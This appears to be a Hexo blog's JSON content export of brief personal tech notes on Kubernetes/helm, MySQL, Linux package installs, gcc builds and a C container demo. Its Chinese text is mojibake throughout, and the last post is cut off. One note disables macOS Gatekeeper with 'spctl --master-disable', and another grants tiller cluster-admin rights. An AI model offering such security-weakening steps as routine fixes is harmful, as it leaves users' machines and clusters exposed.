{"meta":{"title":"ç‹ç§€æ–‡","subtitle":null,"description":null,"author":"williamwong","url":"https://wangxiuwen.github.io","root":"/"},"pages":[],"posts":[{"title":"å‹æƒ…é“¾æ¥","slug":"links","date":"2020-11-29T01:42:08.779Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"links/","link":"","permalink":"https://wangxiuwen.github.io/links/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Repositories","slug":"repository","date":"2020-11-29T01:42:08.779Z","updated":"2020-11-29T01:42:08.779Z","comments":false,"path":"repository/","link":"","permalink":"https://wangxiuwen.github.io/repository/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"ç½‘å€å¯¼èˆª","slug":"site-navs","date":"2020-11-29T01:42:08.779Z","updated":"2020-11-29T01:42:08.779Z","comments":false,"path":"site-navs/","link":"","permalink":"https://wangxiuwen.github.io/site-navs/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"æ ‡ç­¾","slug":"tags","date":"2020-11-29T01:42:08.779Z","updated":"2020-11-29T01:42:08.779Z","comments":false,"path":"tags/","link":"","permalink":"https://wangxiuwen.github.io/tags/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"helm tls è¯ä¹¦é…ç½®","slug":"topics/tech/helm-tls-conf","date":"2020-11-29T01:42:08.779Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"topics/tech/helm-tls-conf/","link":"","permalink":"https://wangxiuwen.github.io/topics/tech/helm-tls-conf/","excerpt":"","text":"helm tls è¯ä¹¦é…ç½®1234export HELM_TLS_ENABLE=trueexport HELM_TLS_CA_CERT=/etc/kubernetes/pki/ca.pemexport HELM_TLS_CERT=/etc/kubernetes/pki/admin.pemexport HELM_TLS_KEY=/etc/kubernetes/pki/admin-key.pem","categories":[],"tags":[]},{"title":"åˆ†ç±»","slug":"categories","date":"2020-11-29T01:42:08.743Z","updated":"2020-11-29T01:42:08.743Z","comments":false,"path":"categories/","link":"","permalink":"https://wangxiuwen.github.io/categories/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"test","slug":"test","date":"2019-10-20T00:54:32.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"test/","link":"","permalink":"https://wangxiuwen.github.io/test/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"github ä¿®æ”¹è¯­è¨€ç»Ÿè®¡","slug":"topics/tech/github-ä¿®æ”¹è¯­è¨€ç»Ÿè®¡","date":"2019-10-19T13:01:00.000Z","updated":"2020-11-29T01:42:08.779Z","comments":false,"path":"topics/tech/github-ä¿®æ”¹è¯­è¨€ç»Ÿè®¡/","link":"","permalink":"https://wangxiuwen.github.io/topics/tech/github-%E4%BF%AE%E6%94%B9%E8%AF%AD%E8%A8%80%E7%BB%9F%E8%AE%A1/","excerpt":"","text":"å‚è€ƒåœ°å€:https://www.cnblogs.com/kavlez/p/4214112.html","categories":[],"tags":[]},{"title":"home","slug":"home","date":"2019-10-17T13:18:18.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"home/","link":"","permalink":"https://wangxiuwen.github.io/home/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Hello, æˆ‘æ˜¯ç‹ç§€æ–‡","slug":"about","date":"2019-10-17T06:13:13.000Z","updated":"2020-11-29T01:42:08.743Z","comments":false,"path":"about/","link":"","permalink":"https://wangxiuwen.github.io/about/","excerpt":"","text":"Hakuna Matata ğŸ”¨ æŠ€æœ¯æ ˆå¸¸ç”¨è¯­è¨€:nodejsgopythonjavağŸš shellæ•°æ®åº“:redismysqlmongodbæœç´¢å¼•æ“:elasticsearchæ¶ˆæ¯é˜Ÿåˆ—:kafkaå¤§æ•°æ®å¤„ç†:sparkç½‘å…³:nginxCI/CD:gitlab-ci/jenkinsansibleå®¹å™¨/äº‘åŸç”Ÿ:dockerk8s(istio/envoy) ğŸŒ æŠ€æœ¯åšå®¢https://wangxiuwen.com ğŸ¡ ä¸šä½™çˆ±å¥½ğŸ¸ å¼¹å‰ä»–ğŸ“· æ‘„å½± ğŸ“Ÿ è”ç³»æˆ‘ğŸ“² å¾®ä¿¡: wangxiuwenwenâœ‰ï¸ wangxiuwen@wangxiuwen.comğŸ± github","categories":[],"tags":[]},{"title":"docsify æ–‡æ¡£ç½‘ç«™","slug":"history/tech/5da1a5a3a24691a906b2e1df","date":"2019-10-11T22:06:27.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5da1a5a3a24691a906b2e1df/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5da1a5a3a24691a906b2e1df/","excerpt":"","text":"https://docsify.js.org/#/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"eslint è®¾ç½®","slug":"history/tech/5da07c76a24691a906b2e1de","date":"2019-10-11T00:58:30.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5da07c76a24691a906b2e1de/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5da07c76a24691a906b2e1de/","excerpt":"","text":"vscodeè®¾ç½®ï¼š1234567891011&quot;files.autoSave&quot;:&quot;off&quot;,&quot;eslint.validate&quot;: [ &quot;javascript&quot;, &quot;javascriptreact&quot;, &quot;html&quot;, &#123; &quot;language&quot;: &quot;vue&quot;, &quot;autoFix&quot;: true &#125; ], &quot;eslint.options&quot;: &#123; &quot;plugins&quot;: [&quot;html&quot;] &#125;é¥¿äº†ä¹ˆ eslintï¼šhttps://www.npmjs.com/package/eslint-config-elemefevue çš„ eslint:https://github.com/vuejs/eslint-config-vue","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ios 13 é»‘æš—æ¨¡å¼ å…³é—­","slug":"history/tech/5d9eaf494d5e95b106b9f3fd","date":"2019-10-10T04:10:49.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d9eaf494d5e95b106b9f3fd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d9eaf494d5e95b106b9f3fd/","excerpt":"","text":"12è¿˜æ²¡é€‚é…å®Œåˆä¸æƒ³ç»™ç”¨æˆ·çœ‹ï¼Œå¯ä»¥å…ˆæš‚æ—¶å…¨å±€å…³é—­æš—é»‘æ¨¡å¼ï¼šåœ¨ Info.plist æ–‡ä»¶ä¸­ï¼Œæ·»åŠ  key ä¸º User Interface Styleï¼Œç±»å‹ä¸º Stringï¼Œvalue è®¾ç½®ä¸º Light å³å¯ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"mysql æ²¡æœ‰grantæƒé™","slug":"history/tech/5d9ec3f5a24691a906b2e1dd","date":"2019-10-09T17:39:01.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d9ec3f5a24691a906b2e1dd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d9ec3f5a24691a906b2e1dd/","excerpt":"","text":"123show grants for root@&quot;%&quot;;GRANT Grant Option ON *.* TO `root`@`%`;ERROR 1045 (28000): Access deniedè§£å†³ï¼š123select user,host,Grant_priv from user; update mysql.user set Grant_priv=&quot;Y&quot; where user=&quot;root&quot; and host=&quot;%&quot;;GRANT Grant Option ON *.* TO `root`@`%`;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"xxx.app å·²æŸå","slug":"history/tech/5d89878b97d8821c4793c589","date":"2019-09-24T03:03:39.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d89878b97d8821c4793c589/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d89878b97d8821c4793c589/","excerpt":"","text":"1sudo spctl --master-disable","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntuå®‰è£… BCM4312 æ— çº¿é©±åŠ¨","slug":"history/tech/5d86399397d8821c4793c588","date":"2019-09-21T02:54:11.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d86399397d8821c4793c588/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d86399397d8821c4793c588/","excerpt":"","text":"123lshw -C networksudo apt-get updatesudo apt-get install bcmwl-kernel-sourceå‚è€ƒèµ„æ–™:https://askubuntu.com/questions/11993/how-do-i-install-bcm4312-wireless-drivers","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu å®‰è£…ffpmeg","slug":"history/tech/5d85dcc397d8821c4793c587","date":"2019-09-20T20:18:11.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d85dcc397d8821c4793c587/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d85dcc397d8821c4793c587/","excerpt":"","text":"123add-apt-repository ppa:djcj/hybridapt-get updateapt-get install ffmpeg","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ ‘è“æ´¾usbç¡¬ç›˜ä¼‘çœ ","slug":"history/tech/5d7999fa97d8821c4793c586","date":"2019-09-12T01:06:02.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d7999fa97d8821c4793c586/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d7999fa97d8821c4793c586/","excerpt":"","text":"http://sg.danny.cz/sg/sdparm.html12sdparm --flexible --command=stop /dev/sda crontab -l | &#123; cat; echo &quot;/10 * * * * sdparm --command=stop /dev/sda&quot;; &#125; | sudo crontab -","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mac python3 å®‰è£…","slug":"history/tech/5d77ac3807cfaf0c4726b5e1","date":"2019-09-10T01:59:20.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d77ac3807cfaf0c4726b5e1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d77ac3807cfaf0c4726b5e1/","excerpt":"","text":"1brew install python","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos å®‰è£… python3.6","slug":"history/tech/5d7772ec97d8821c4793c585","date":"2019-09-09T21:54:52.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d7772ec97d8821c4793c585/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d7772ec97d8821c4793c585/","excerpt":"","text":"12345678910sudo yum updatesudo yum install yum-utilssudo yum groupinstall developmentsudo yum install https://centos7.iuscommunity.org/ius-release.rpmsudo yum install python36usudo yum install python36u-pipsudo yum install python36u-develpython3.6 -Vpython3.6 -m venv venvhttps://janikarhunen.fi/how-to-install-python-3-6-1-on-centos-7","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos æ›´æ–° gcc","slug":"history/tech/5d77691397d8821c4793c584","date":"2019-09-09T21:12:51.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d77691397d8821c4793c584/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d77691397d8821c4793c584/","excerpt":"","text":"é”™è¯¯ï¼š1ImportError: /lib64/libstdc++.so.6: version `CXXABI_1.3.8&apos; not found (required by /opt/python/python-3.7.3/lib/python3.7/site-packages/tensorflow/python/_pywrap_tensorflow_internal.so)12345678yum install gmp-devel mpfr-devel libmpc-devel wgetwget https://ftp.gnu.org/gnu/gcc/gcc-8.3.0/gcc-8.3.0.tar.gztar xf gcc-8.3.0.tar.gzcd gcc-8.3.0mkdir build &amp;&amp; cd build../configure --enable-languages=c,c++ --disable-multilibmake &amp;&amp; make installexport LD_LIBRARY_PATH=/usr/local/lib64:$&#123;LD_LIBRARY_PATH&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"jupyter notebook å®‰è£…","slug":"history/tech/5d77640c07cfaf0c4726b5e0","date":"2019-09-09T20:51:24.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d77640c07cfaf0c4726b5e0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d77640c07cfaf0c4726b5e0/","excerpt":"","text":"1234567brew install pythonpython3 -m venv venvsource venv/bin/activatepip3 install jupyterpython3 -m ipykernel install --user --name=venvjupyter kernelspec list # æŸ¥çœ‹å¯ç”¨çš„ kerneljupyter notebook","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å®¹å™¨åŸç†","slug":"history/tech/5d6f6bfff955c36b073a37ef","date":"2019-09-03T19:47:11.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d6f6bfff955c36b073a37ef/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d6f6bfff955c36b073a37ef/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243#define _GNU_SOURCE#include &lt;sys/mount.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;stdio.h&gt;#include &lt;sched.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#define STACK_SIZE (1024 * 1024)static char container_stack[STACK_SIZE];char* const container_args[] = &#123; &quot;/bin/bash&quot;, NULL&#125;;//int container_main(void* arg)//&#123;// printf(&quot;Container - inside the container!\\n&quot;);// execv(container_args[0], container_args);// printf(&quot;Something&apos;s wrong!\\n&quot;);// return 1;//&#125;int container_main(void* arg)&#123; printf(&quot;Container - inside the container!\\n&quot;); // å¦‚æœä½ çš„æœºå™¨çš„æ ¹ç›®å½•çš„æŒ‚è½½ç±»å‹æ˜¯sharedï¼Œé‚£å¿…é¡»å…ˆé‡æ–°æŒ‚è½½æ ¹ç›®å½• mount(&quot;&quot;, &quot;/&quot;, NULL, MS_PRIVATE, &quot;&quot;); mount(&quot;none&quot;, &quot;/tmp&quot;, &quot;tmpfs&quot;, 0, &quot;&quot;); execv(container_args[0], container_args); printf(&quot;Something&apos;s wrong!\\n&quot;); return 1;&#125;int main()&#123; printf(&quot;Parent - start a container!\\n&quot;); int container_pid = clone(container_main, container_stack+STACK_SIZE, CLONE_NEWNS | SIGCHLD , NULL); waitpid(container_pid, NULL, 0); printf(&quot;Parent - container stopped!\\n&quot;); return 0;&#125;å‚è€ƒèµ„æ–™https://coolshell.cn/articles/17010.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"lxcfs","slug":"history/tech/5d6e2ed8f955c36b073a37ee","date":"2019-09-02T21:14:00.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d6e2ed8f955c36b073a37ee/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d6e2ed8f955c36b073a37ee/","excerpt":"","text":"https://www.lijiaocn.com/æŠ€å·§/2019/01/09/kubernetes-lxcfs-docker-container.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ReactiveCocoa(RAC)çš„ç®€å•ä½¿ç”¨","slug":"history/tech/5d63b0d49ebd557707cbd1e1","date":"2019-08-25T22:13:40.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d63b0d49ebd557707cbd1e1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d63b0d49ebd557707cbd1e1/","excerpt":"","text":"https://www.jianshu.com/p/11149883b872","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"ReactiveCocoa(RAC)çš„ç®€å•ä½¿ç”¨","slug":"ReactiveCocoa-RAC-çš„ç®€å•ä½¿ç”¨","permalink":"https://wangxiuwen.github.io/tags/ReactiveCocoa-RAC-%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"}],"author":"baipeng"},{"title":"ios å¯¼èˆªæ¡","slug":"history/tech/5d63ab989ebd557707cbd1e0","date":"2019-08-25T21:51:20.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d63ab989ebd557707cbd1e0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d63ab989ebd557707cbd1e0/","excerpt":"","text":"https://www.jianshu.com/p/bb4b0e7f40c7https://github.com/rickytan/RTRootNavigationControllerhttps://tech.meituan.com/2018/10/25/navigation-transition-solution-and-best-practice-in-meituan.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Ubuntu 18.04ç¼ºå°‘libgconf-2.so.4","slug":"history/tech/5d5f90a39ebd557707cbd1df","date":"2019-08-22T19:07:15.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d5f90a39ebd557707cbd1df/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d5f90a39ebd557707cbd1df/","excerpt":"","text":"sudo apt -y install libgconf2-4","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ç¼–è¯‘ rdm","slug":"history/tech/5d494ffef955c36b073a37ed","date":"2019-08-05T22:01:34.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d494ffef955c36b073a37ed/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d494ffef955c36b073a37ed/","excerpt":"","text":"ç¼–è¯‘æ­¥éª¤ï¼šhttp://docs.redisdesktop.com/en/latest/install/#build-from-sourceå‡ å¤„ä¿®æ”¹ï¼š1234567891011121314151617181920unix:macx &#123; # OSX QT += svg CONFIG += c++11 #debug: CONFIG-=app_bundle release: DESTDIR = ./../bin/osx/release #debug: DESTDIR = ./../bin/osx/debug #deployment QMAKE_INFO_PLIST = $$PWD/resources/Info.plist ICON = $$PWD/resources/rdm.icns #release &#123; #CRASHREPORTER_APP.files = $$DESTDIR/crashreporter #CRASHREPORTER_APP.path = Contents/MacOS #QMAKE_BUNDLE_DATA += CRASHREPORTER_APP #&#125;&#125;æ‰“åŒ…ï¼š1macdeployqt rdm.app -qmldir=/Users/williamwang/workspace/rdm/src/qml -dmg","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"helm å®‰è£…","slug":"history/tech/5d3ec471f955c36b073a37ec","date":"2019-07-28T22:03:29.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d3ec471f955c36b073a37ec/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d3ec471f955c36b073a37ec/","excerpt":"","text":"helm å®‰è£…å®˜ç½‘ä¸‹è½½äºŒè¿›åˆ¶åŒ…å®‰è£…ï¼ˆå¿½ç•¥ï¼‰åˆ›å»ºtillerçš„serviceaccountå’Œclusterrolebinding12kubectl create serviceaccount --namespace kube-system tillerkubectl create clusterrolebinding tiller-cluster-rule --clusterrole=cluster-admin --serviceaccount=kube-system:tillertiller å®‰è£…1helm init --upgrade -i registry.cn-hangzhou.aliyuncs.com/google_containers/tiller:v2.14.1 --stable-repo-url https://kubernetes.oss-cn-hangzhou.aliyuncs.com/chartsä¸ºåº”ç”¨ç¨‹åºè®¾ç½®serviceAccountï¼š1kubectl patch deploy --namespace kube-system tiller-deploy -p &apos;&#123;&quot;spec&quot;:&#123;&quot;template&quot;:&#123;&quot;spec&quot;:&#123;&quot;serviceAccount&quot;:&quot;tiller&quot;&#125;&#125;&#125;&#125;&apos;æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ1kubectl -n kube-system get pods|grep tiller","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"nodejs request è°ƒç”¨ å¾®ä¿¡å°ç¨‹åºäºŒç»´ç ç”Ÿäº§æ¥å£æ³¨æ„äº‹é¡¹","slug":"history/tech/5d3b1c749ebd557707cbd1dc","date":"2019-07-26T03:29:56.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d3b1c749ebd557707cbd1dc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d3b1c749ebd557707cbd1dc/","excerpt":"","text":"requesté»˜è®¤ä¼šè¿›è¡Œç¼–ç ï¼ï¼ï¼æœ€åå¯¼è‡´çš„å°±æ˜¯ç”Ÿæˆçš„å›¾ç‰‡æ‰“ä¸å¼€è®¾ç½®è¯·æ±‚å‚æ•°encoding: null,å³å¯","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"CocoaPods æ¸…åé•œåƒ","slug":"history/tech/5d2c825bf955c36b073a37eb","date":"2019-07-15T01:40:43.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d2c825bf955c36b073a37eb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d2c825bf955c36b073a37eb/","excerpt":"","text":"https://mirrors.tuna.tsinghua.edu.cn/help/CocoaPods/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centoså®‰è£…firefox flashæ’ä»¶","slug":"history/tech/5d242b206dbb8da90e6467ff","date":"2019-07-08T17:50:24.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d242b206dbb8da90e6467ff/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d242b206dbb8da90e6467ff/","excerpt":"","text":"12sudo yum -y install http://linuxdownload.adobe.com/linux/x86_64/adobe-release-x86_64-1.0-1.noarch.rpmsudo yum install flash-plugin","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ•°æ®ç»“æ„","slug":"history/tech/5d22a2dfdfd77a680816d21f","date":"2019-07-08T01:56:47.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/tech/5d22a2dfdfd77a680816d21f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5d22a2dfdfd77a680816d21f/","excerpt":"","text":"Chunk it upï¼ˆåˆ‡ç¢çŸ¥è¯†ç‚¹ï¼‰Deliberate practicingï¼ˆåˆ»æ„ç»ƒä¹ ï¼‰åˆ»æ„ç»ƒä¹ ç»ƒä¹ ç¼ºé™·ã€ä¸èˆ’æœã€å¼±ç‚¹åœ°â½…ä¸çˆ½ã€æ¯ç‡¥Feedbackï¼ˆè·å¾—åé¦ˆï¼‰å³æ—¶åé¦ˆä¸»åŠ¨å‹åé¦ˆé«˜æ‰‹ä»£ç  (GitHub, LeetCode, etc.) åˆ‡é¢˜å››ä»¶å¥—ClarificationPossible 